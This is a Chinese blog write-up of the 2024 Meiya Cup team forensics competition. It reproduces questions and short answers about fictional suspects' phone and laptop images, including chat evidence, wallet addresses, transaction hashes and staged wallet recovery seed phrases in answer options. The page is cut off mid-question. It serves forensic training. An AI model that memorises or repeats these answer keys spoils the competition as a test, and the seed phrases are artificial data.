@@ -1,0 +1,1347 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <canvas id="fireworks" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: 32767"></canvas>
+    <script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+    <script src="/js/<file>"></script>
+    <link rel="stylesheet" href="/css/<file>" />
+    <script src="/js/fireworks.min.js"></script>
+    <canvas id="background" style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; pointer-events: none; z-index: -1"></canvas>
+    <script src="/js/background.min.js"></script>
+    <div id="cursor"></div>
+    <link rel="stylesheet" href="/css/cursor.min.css">
+    <script src="/js/cursor.min.js"></script>
+    <meta charset="utf-8" />
+    <title>2024美亚杯团体赛复现 | OvO</title>
+    <meta name="author" content="你猜不到的" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"
+    />
+    <link rel="icon" href="/images/kkk.png" />
+    <link rel="preconnect" href="https://s4.zstatic.net" />
+<script src="https://s4.zstatic.net/ajax/libs/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.googleapis.cn" />
+<link rel="preconnect" href="https://fonts.gstatic.cn" crossorigin />
+<link
+    rel="stylesheet"
+    href="https://fonts.googleapis.cn/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap"
+/>
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.alicdn.com/v3/polyfill.min.js?features=default"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link
+    rel="stylesheet"
+    href="https://s4.zstatic.net/ajax/libs/highlight.js/11.9.0/styles/github.min.css"
+/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.js"></script>
+<script src="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://s4.zstatic.net/ajax/libs/KaTeX/0.16.9/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.3.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/loading.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>OVO</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;Archives</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;OVO</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>2024美亚杯团体赛复现</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2025/11/6
+        </span>
+        
+        <span class="category">
+            <a href="/categories/CTF/">
+                <span class="icon">
+                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                </span>
+                CTF
+            </a>
+        </span>
+        
+        
+        <span class="tags">
+            <span class="icon">
+                <i class="fa-solid fa-tags fa-fw"></i>
+            </span>
+            
+            
+            <span class="tag">
+                
+                <a href="/tags/%E5%8F%96%E8%AF%81/" style="color: #ffa2c4">
+                    取证
+                </a>
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/wp/" style="color: #00bcd4">
+                    wp
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <p>终于写完了，团队赛的难度比资格赛大了很多感觉（），硬盘里正好有数证杯检材应该尽量再写个数证杯的wp（能写多少写多少orz。</p>
+<span id="more"></span>
+<p>复现参考wp（滑跪：<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_81210668/article/details/147111162?sharetype=blogdetail&amp;shareId=147111162&amp;sharerefer=APP&amp;sharesource=2401_87851833&amp;sharefrom=link">2024年美亚杯团体赛wp</a>、<a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_79200709/article/details/151105527?sharetype=blogdetail&amp;shareId=151105527&amp;sharerefer=APP&amp;sharesource=2401_87851833&amp;sharefrom=link">2024美亚杯团体赛详细题解</a>。</p>
+<h3 id="alice的android手机取证"><em>Alice的Android手机取证</em></h3>
+<h4 id="填空题在个人赛的最后一部分你对david的数字设备进行了取证检查发现他与一名成员alice有可疑的沟通你现在分析alice的手机参考alice_mobile.binalice所使用的手机网络运营商公司的名称是什么答案格式-请用大写英文字母作答-无须留空白">1.[填空题]在个人赛的最后一部分，你对David的数字设备进行了取证检查，发现他与一名成员Alice有可疑的沟通。你现在分析Alice的手机。参考Alice_Mobile.bin，Alice所使用的手机网络运营商公司的名称是什么？（答案格式: 请用大写英文字母作答 ，无须留空白）</h4>
+<p>这里看SIM卡记录。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/6.png"></p>
+<h4 id="填空题参考alice_mobile.binalice-所使用的谷歌电子邮件地址是答案格式-请用小写英文字母作答例如abcgoogle.com">2.[填空题]参考Alice_Mobile.bin，Alice 所使用的谷歌电子邮件地址是？（答案格式: 请用小写英文字母作答，例如:abc@google.com）</h4>
+<p>直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/3.png"></p>
+<h4 id="单选题参考alice_mobile.bin谁向alice发送了一个含有个人资料的xlsx文件">3.[单选题]参考Alice_Mobile.bin，谁向Alice发送了一个含有个人资料的xlsx文件？</h4>
+<h5 id="a.-david">A. David</h5>
+<h5 id="b.-john">B. John</h5>
+<h5 id="c.-ben">C. Ben</h5>
+<h5 id="d.-amy">D. Amy</h5>
+<h5 id="e.-harry">E. Harry</h5>
+<p>直接看文档记录就行。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/4.png"></p>
+<h4 id="填空题承上题参考alice_mobile.bin该文件以md5计算的哈希值是答案格式-请用大写英文字母作答和用阿拉伯数字回答">4.[填空题]承上题，参考Alice_Mobile.bin，该文件以MD5计算的哈希值是？（答案格式: 请用大写英文字母作答和用阿拉伯数字回答）</h4>
+<p>导出了看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/7.png"></p>
+<h4 id="单选题参考alice_mobile.binalice于facebook脸书所建立的群组">5.[单选题]参考Alice_Mobile.bin，Alice于Facebook（脸书）所建立的群组？</h4>
+<h5 id="a.-大学生炒散搵工群">A. 大学生炒散搵工群</h5>
+<h5 id="b.-最全面搵工推介">B. 最全面搵工推介</h5>
+<h5 id="c.-全港笋工好工推介2024">C. 全港笋工好工推介2024</h5>
+<h5 id="d.-搵工全职兼职">D. 搵工全职兼职</h5>
+<h5 id="e.-搵工whatsapp群">E. 搵工WhatsApp群</h5>
+<p>这里我刚开始一直找不到，facebook没有群组记录，是通过暴力搜索找到的。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/10.png"></p>
+<p>后面在做其他题的时候在和别人的聊天记录里找到了。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/9.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/8.png"></p>
+<h4 id="单选题参考alice_mobile.binalice在2024年8月15日于哪个地铁站和客服人员相约见面">6.[单选题]参考Alice_Mobile.bin，Alice在2024年8月15日于哪个地铁站和“客服人员”相约见面？</h4>
+<h5 id="a.-chai-wan">A. Chai Wan</h5>
+<h5 id="b.-tai-koo">B. Tai Koo</h5>
+<h5 id="c.-wan-chai">C. Wan Chai</h5>
+<h5 id="d.-central">D. Central</h5>
+<h5 id="e.-mong-kok">E. Mong Kok</h5>
+<p>这里直接搜索选项关键字没找到，换了个关键字station搜（你们为什么一定要用英文对话。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/12.png"></p>
+<h4 id="填空题参考alice_mobile.bin受骗女子欧凯被指示将虚拟货币转到哪个钱包地址答案格式-大写英文字母-小写英文字母及阿拉伯数字混合组成例如-0xdasdgjhi34twebghjk2354yu34h">7.[填空题]参考Alice_Mobile.bin，受骗女子欧凯被指示将虚拟货币转到哪个钱包地址？（答案格式: 大写英文字母， 小写英文字母及阿拉伯数字混合组成，例如: 0xDasdGJHI34twebGHJK2354YU34h）</h4>
+<p>在这个骗子家庭群聊里。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/13.png"></p>
+<h4 id="单选题参考alice_mobile.binalice指示客服人员使用什么交通工具离开香港">8.[单选题]参考Alice_Mobile.bin，Alice指示“客服人员”使用什么交通工具离开香港？</h4>
+<h5 id="a.-火车">A. 火车</h5>
+<h5 id="b.-私家车">B. 私家车</h5>
+<h5 id="c.-飞机">C. 飞机</h5>
+<h5 id="d.-船">D. 船</h5>
+<h5 id="e.-货柜车">E. 货柜车</h5>
+<p>这里在聊天记录里找到她联系人用船走。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/11.png"></p>
+<h4 id="填空题参考alice_mobile.bin客服人员zhang-wei的银行卡号是多少答案格式用阿拉伯数字回答-例如-54613165456431">9.[填空题]参考Alice_Mobile.bin，客服人员“ZHANG WEI”的银行卡号是多少？（答案格式:用阿拉伯数字回答， 例如: 54613165456431）</h4>
+<p>直接在和他的聊天记录里就有。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/14.png"></p>
+<h4 id="单选题参考alice_mobile.binalice总共在脸书facebook上发布了多少张照片">10. [单选题]参考Alice_Mobile.bin，Alice总共在脸书（FACEBOOK）上发布了多少张照片？</h4>
+<h5 id="a.-1">A. 1</h5>
+<h5 id="b.-3">B. 3</h5>
+<h5 id="c.-5">C. 5</h5>
+<h5 id="d.-7">D. 7</h5>
+<h5 id="e.-9">E. 9</h5>
+<p>这里我没找到，在图片里搜关键字facebook只有一张图片，后面看师傅们的wp要去数据库里找。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/15.png"></p>
+<h4 id="填空题参考alice_mobile.bin应用程序whatsapp的数据库database内哪个message_type代表发送的内容是表情包sticker">11.[填空题]参考Alice_Mobile.bin，应用程序WhatsApp的数据库（database）内，哪个message_type代表发送的内容是表情包（Sticker）</h4>
+<p>这里先把聊天记录的数据库导出来。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/16.png"></p>
+<p>找一条包含表情包的消息。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/17.png"></p>
+<p>把message表导出后搜索上一条消息的关键字下一条就是表情包。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/19.png"></p>
+<h4 id="填空题参考alice_mobile.bin在alice手机中哪一个数据库database记录了照片的数据答案格式只需使用全部大写回答-例如abc.db">12.[填空题]参考Alice_Mobile.bin，在Alice手机中，哪一个数据库（Database）记录了照片的数据？（答案格式：只需使用全部大写回答， 例如：ABC.DB）</h4>
+<p>这个在前面的取证练习里其实就做到过，安卓手机的照片数据库是external。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/18.png"></p>
+<h4 id="填空题承上题参考alice_mobile.bin该文件的最后修改日期和时间-last-modified-time-是答案格式yyyy-mm-dd-hhmmss">13.[填空题]承上题，参考Alice_Mobile.bin，该文件的最后修改日期和时间 （Last Modified Time） 是？（答案格式：YYYY-MM-DD HH:MM:SS）</h4>
+<p>直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/20.png"></p>
+<h3 id="john的ios手机取证"><em>John的IOS手机取证</em></h3>
+<h4 id="单选题从alice的手机中发现她一直与一名叫john的成员保持联系你接着分析john的手机参考john_smartphone_itunebackup.zip备份密码是1234回答以下题目在whatsapp通讯软件内三五成群群组于什么时间创建">14.[单选题]从Alice的手机中发现，她一直与一名叫John的成员保持联系，你接着分析John的手机。参考John_Smartphone_itunebackup.zip，备份密码是「1234」，回答以下题目：在WhatsApp通讯软件内「三五成群」群组于什么时间创建？</h4>
+<h5 id="a.-2024-08-29-174438">A. 2024-08-29 17:44:38</h5>
+<h5 id="b.-2024-07-25-152209">B. 2024-07-25 15:22:09</h5>
+<h5 id="c.-2024-07-30-124550">C. 2024-07-30 12:45:50</h5>
+<h5 id="d.-2024-07-30-161534">D. 2024-07-30 16:15:34</h5>
+<p>在聊天记录里直接看。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/21.png"></p>
+<h4 id="单选题参考john_smartphone_itunebackup.zip照片img_007的创建日期时间是">15.[单选题]参考John_Smartphone_itunebackup.zip，照片IMG_007的创建日期时间是？</h4>
+<h5 id="a.-2024年8月14日星期三下午0254">A. 2024年8月14日星期三下午02:54</h5>
+<h5 id="b.-2024年9月02日星期三下午1254">B. 2024年9月02日星期三下午12:54</h5>
+<h5 id="c.-2024年8月14日星期三下午1254">C. 2024年8月14日星期三下午12:54</h5>
+<h5 id="d.-2024年8月16日星期五下午1254">D. 2024年8月16日星期五下午12:54</h5>
+<p>here。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/22.png"></p>
+<h4 id="单选题参考john_smartphone_itunebackup.zipjohn曾使用什么通讯软件联系ben">16.[单选题]参考John_Smartphone_itunebackup.zip，John曾使用什么通讯软件联系Ben？</h4>
+<h5 id="a.-reddit">A. Reddit</h5>
+<h5 id="b.-whatsapp">B. WhatsApp</h5>
+<h5 id="c.-wechat">C. WeChat</h5>
+<h5 id="d.-line">D. Line</h5>
+<p>Whatsapp。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/23.png"></p>
+<h4 id="填空题参考john_smartphone_itunebackup.zip于三五成群群中电子表格文件personal_data.xlsx是由哪一个电话号码发送到该群组的答案格式只需要用阿拉伯数字回答包含国际电话区号和电话号码例如85290001111">17.[填空题]参考John_Smartphone_itunebackup.zip，于“三五成群”群中，电子表格文件“Personal_data.xlsx”是由哪一个电话号码发送到该群组的？（答案格式：只需要用阿拉伯数字回答，包含国际电话区号和电话号码，例如：85290001111）</h4>
+<p>这里有两个关于文档的发送记录，要区别一下是发给群组的。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/24.png"></p>
+<p><em>Ben的IOS手机取证</em></p>
+<h4 id="单选题他与一个叫ben的人有可疑的沟通你接着分析ben的手机参考beniphone.zip根据ben手机内通讯软件的记录this-is-a-rat-apk-that-allows-us-to-control-android-devices-remotely-enabling-data-access-monitoring-and-manipulation-through-an-interface是在什么时间接收或发出的">18.[单选题]他与一个叫Ben的人有可疑的沟通。你接着分析Ben的手机。参考BeniPhone.zip，根据Ben手机内通讯软件的记录，“This is a RAT APK that allows us to control Android devices remotely， enabling data access， monitoring and manipulation through an interface”是在什么时间接收或发出的？</h4>
+<h5 id="a.-由ben于2024-08-02-161707接收">A. 由Ben于2024-08-02 16:17:07接收</h5>
+<h5 id="b.-由ben于2024-08-05-155337发出">B. 由Ben于2024-08-05 15:53:37发出</h5>
+<h5 id="c.-由ben于2024-08-05-165812接收">C. 由Ben于2024-08-05 16:58:12接收</h5>
+<h5 id="d.-由ben于2024-08-05-172247发出">D. 由Ben于2024-08-05 17:22:47发出</h5>
+<p>这个IOS备份密码没给，所以答案我要么在别人的手机找的，要么不火眼取证分析直接文件里找。</p>
+<p>这个消息正好是发给john的。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/25.png"></p>
+<h4 id="单选题参考beniphone.zip根据ben手机内的照片记录img_0011.png是通过哪种方式生成的">19.[单选题]参考BeniPhone.zip，根据Ben手机内的照片记录，“IMG_0011.PNG”是通过哪种方式生成的？</h4>
+<h5 id="a.-从互联网下载">A. 从互联网下载</h5>
+<h5 id="b.-手机拍摄">B. 手机拍摄</h5>
+<h5 id="c.-手机截图">C. 手机截图</h5>
+<h5 id="d.-以上皆不是">D. 以上皆不是</h5>
+<p>刚开始去照片数据库里找好像没有记录，于是直接文件里找根据照片判断是张截图。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/26.png"></p>
+<h3 id="综合分析"><em>综合分析</em></h3>
+<h4 id="单选题你发现了该犯罪团伙似乎有一个共同的聊天群其中包含有关可疑资本管理与虚拟货币相关的更多线索参考该聊天群组对话分析johndavid及alice筹集资金的目的是什么">20.[单选题]你发现了该犯罪团伙似乎有一个共同的聊天群，其中包含有关可疑资本管理（与虚拟货币相关）的更多线索。参考该聊天群组对话分析，John，David及Alice筹集资金的目的是什么？</h4>
+<h5 id="a.-建立一个网站给人投资虚拟货币">A. 建立一个网站给人投资虚拟货币</h5>
+<h5 id="b.-建立一个网站用作行骗">B. 建立一个网站用作行骗</h5>
+<h5 id="c.-创建虚拟货币钱包用作洗黑钱">C. 创建虚拟货币钱包用作洗黑钱</h5>
+<h5 id="d.-写一个android-apk应用程序包用作沟通">D. 写一个Android （APK）应用程序包，用作沟通</h5>
+<p>这里先看一下这三个人在的群组。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/29.png"></p>
+<p>然后根据聊天记录判断是B。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/27.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/28.png"></p>
+<h4 id="单选题参考該聊天群对话davidemma與clara的对话及idfc的交易记录分析哪一个虚拟货币地址储存johndavid及alice所筹集的idfc">21.[单选题]参考該聊天群对话、David，Emma與Clara的对话及IDFC的交易记录分析，哪一个虚拟货币地址储存John，David及Alice所筹集的IDFC？</h4>
+<h5 id="a.-0xe90ad3f80e39e83b533eef3ed23c641ec51089c6">A. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6</h5>
+<h5 id="b.-0x04d079c7ace663bbe1d2c201072d63b036d16ccd">B. 0x04d079c7ace663bbe1d2c201072d63b036d16ccd</h5>
+<h5 id="c.-0x10a4f01b80203591ccee76081a4489ae1cd1281c">C. 0x10a4f01b80203591ccee76081a4489ae1cd1281c</h5>
+<h5 id="d.-0x8155c0b8a0c95424f433d8ab6342086f0433e6c4">D. 0x8155c0b8a0c95424f433d8ab6342086f0433e6c4</h5>
+<p>这里我是直接根据资格赛的记忆判断的选C。</p>
+<h4 id="单选题参考alice_mobile.binalice总共使用了多少个虚拟货币地址直接接收受害人的idfc">22.[单选题]参考Alice_Mobile.bin，Alice总共使用了多少个虚拟货币地址直接接收受害人的IDFC？</h4>
+<h5 id="a.-1-1">A. 1</h5>
+<h5 id="b.-3-1">B. 3</h5>
+<h5 id="c.-6">C. 6</h5>
+<h5 id="d.-7-1">D. 7</h5>
+<p>这里搜一下关键字0x，有六条相关地址的记录。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/30.png"></p>
+<h4 id="多选题參考david_laptop.e01内找到的idfc交易记录在收取受害人的idfc后它之后会再流向哪些虚拟货币地址">23.[多选题]參考David_Laptop.e01内找到的IDFC交易记录，在收取受害人的IDFC后，它之后会再流向哪些虚拟货币地址？</h4>
+<h5 id="a.-0xb2e3dbea311511ec5bda3e85e061f15366f888a6">A. 0xb2e3dbea311511ec5bda3e85e061f15366f888a6</h5>
+<h5 id="b.-0x70544880875fe907cee383873ca58da23378caa5">B. 0x70544880875fe907cee383873ca58da23378caa5</h5>
+<h5 id="c.-0x152c90200be61a540875f2a752c328bd19dbfb87">C. 0x152c90200be61a540875f2a752c328bd19dbfb87</h5>
+<h5 id="d.-0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220">D. 0x59eb2c55eefdd4d8af2886c9fd8fc6f465c3e220</h5>
+<p>其实我一做完资格赛的题就把检材删了……幸好当时截图了交易记录文件。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/1.png"> <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/2.png"></p>
+<p>但是这个应该根据Alice的聊天记录里就能判断，这三个地址正好是BCD。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/31.png"></p>
+<h4 id="单选题承上题上述idfc去到那些地址后谁掌管这些idfc提示分析idfc的交易记录及个人赛所搜集的证据">24.[单选题]承上题，上述IDFC去到那些地址后，谁掌管这些IDFC？（提示：分析IDFC的交易记录及个人赛所搜集的证据）</h4>
+<h5 id="a.-alice回復種子pumpkin-fold-behind-captain-shoulder-demand-print-hospital-like-smoke-gate-weird">A. Alice（回復種子：pumpkin fold behind captain shoulder demand print hospital like smoke gate weird）</h5>
+<h5 id="b.-ben回復種子wrap-muscle-rhythm-stamp-bundle-zebra-gorilla-shuffle-common-tattoo-ginger-awake">B. Ben（回復種子：wrap muscle rhythm stamp bundle zebra gorilla shuffle common tattoo ginger awake）</h5>
+<h5 id="c.-john回復種子abandon-among-anxiety-pizza-evidence-face-quiz-ripple-nerve-pact-nasty-unveil">C. John（回復種子：abandon among anxiety pizza evidence face quiz ripple nerve pact nasty unveil）</h5>
+<h5 id="d.-david回復種子stock-avocado-grab-clay-light-sadness-segment-ancient-toe-talk-elder-oil">D. David（回復種子：stock avocado grab clay light sadness segment ancient toe talk elder oil）</h5>
+<p>这个其实根据个人赛就能判断应该是David，不过三人小群聊天记录分析的时候里面也有说David是管钱的。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/32.png"></p>
+<h4 id="单选题2024年9月tom-victor带同其秘书amy来到警署报案称其秘书被骗子用人工智能视频在2024年8月29日早上骗去10000000-idfc清找出该交易的交易哈希ransaction-hash">25.[单选题]2024年9月，Tom Victor带同其秘书Amy来到警署报案，称其秘书被骗子用人工智能视频在2024年8月29日早上骗去10，000，000 IDFC，清找出该交易的交易哈希（ransaction Hash）？</h4>
+<h5 id="a.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a483dd92d">A.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a483dd92d</h5>
+<h5 id="b.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792a">B.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792a</h5>
+<h5 id="c.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792d">C.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792d</h5>
+<h5 id="d.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792c">D.0x04dcfbb681e125076c7f3c79ddee7e2b4859881ad031e90cf7fc251a4835792c</h5>
+<p>这个对应交易记录最后一条。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/33.png"></p>
+<h4 id="多选题就現時搜集到的證據david-laptop-64gb.e01内的资料及idfc的资金流分析下列哪些虚擬货币地址是最終诈骗集团儲存犯罪所得的地址">26.[多选题]就現時搜集到的證據、David Laptop 64GB.e01内的资料及IDFC的资金流分析，下列哪些虚擬货币地址是最終诈骗集团儲存犯罪所得的地址？</h4>
+<h5 id="a.-0x63a8ba1df0404ee41f7c6af8efd2f54006f32042">A. 0x63a8ba1df0404ee41f7c6af8efd2f54006f32042</h5>
+<h5 id="b.-0xe90ad3f80e39e83b533eef3ed23c641ec51089c6">B. 0xe90ad3f80e39e83b533eef3ed23c641ec51089c6</h5>
+<h5 id="c.-0x10a4f01b80203591ccee76081a4489ae1cd1281c-1">C. 0x10a4f01b80203591ccee76081a4489ae1cd1281c</h5>
+<h5 id="d.-0x90f73497e4446f6cf9881213c32d6af66d799fe5">D. 0x90f73497e4446f6cf9881213c32d6af66d799fe5</h5>
+<p>这个根据交易记录判断是AD，其他两个可以在上面的记录里看到是中转地址。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/34.png"></p>
+<h3 id="ben的windows笔记本电脑取证"><em>Ben的Windows笔记本电脑取证</em></h3>
+<h4 id="单选题你现在査看ben的笔记本电脑并发现了apk文件一般而言apk的关键组成部分是什么">27.[单选题]你现在査看Ben的笔记本电脑，并发现了APK文件。一般而言，APK的关键组成部分是什么？</h4>
+<h5 id="a.androidmanifest.xml-classes.dex-resources.arsc-res">A.AndroidManifest.xml， classes.dex， resources.arsc， res/</h5>
+<h5 id="b.-androidmanifest.xml-meta-inf-res-assets">B. AndroidManifest.xml， META-INF/， res/， assets/</h5>
+<h5 id="c.classes.dex-lib-androidmanifest.xml-meta-inf">C.classes.dex， lib/， AndroidManifest.xml， META-INF/</h5>
+<h5 id="d.res-assets-androidmanifest.xml-classes.dex">D.res/， assets/， AndroidManifest.xml， classes.dex</h5>
+<p>理论题直接梭。 <img src="https://github.com/ncbdd0/images/raw/main/meiya2024group/35.png"></p>
+<h4 id="单选题参考ben_laptop.zip内的joshe-investment.apk这个apk没有classes.dex文件而是有smali文件以下哪一个陈述是正确的">28.[单选题]参考Ben_Laptop.zip内的Joshe Investment.apk，这个APK没有classes.dex文件，而是有smali文件，以下哪一个陈述是正确的？</h4>
+<h5 id="a.-这是一个經過反向工程製作的apk">A. 这是一个經過反向工程製作的APK</h5>
+<h5 id="b.-该apk已损坏">B. 该APK已损坏</h5>
